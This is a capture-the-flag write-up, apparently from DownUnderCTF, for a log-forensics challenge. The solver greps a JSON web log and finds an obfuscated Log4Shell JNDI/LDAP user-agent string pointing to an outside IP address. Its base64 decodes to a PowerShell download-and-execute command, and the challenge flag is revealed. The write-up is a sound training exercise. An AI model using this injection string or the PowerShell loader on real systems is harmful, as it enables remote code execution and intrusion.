#### Challenge:

We implemented a basic IPS to help protect our site from new attacks.

Somehow, a newer more sophisticated version of a regularly observed attack was successfully executed against the website.

What is the name of the script that was run?

Flag format: Name of the script that was run, case sensitive.

---

#### Solution:

Running (on the [JSON](../Shop-SetupDisclaimer/DownUnderShop.JSON)):

```bash
grep "useragent" DownUnderShop.JSON | sort | uniq
```

I noticed

```text
    "useragent": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}",
```

Decoding that `base64` part gives:

```text
Decoding base64 gives:
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');
```

The last segment of the URL is the flag.

---

<details><summary>FLAG:</summary>

```
pTCNp5p6LP0d7qA77yvb4SHf40
```

</details>
<br/>
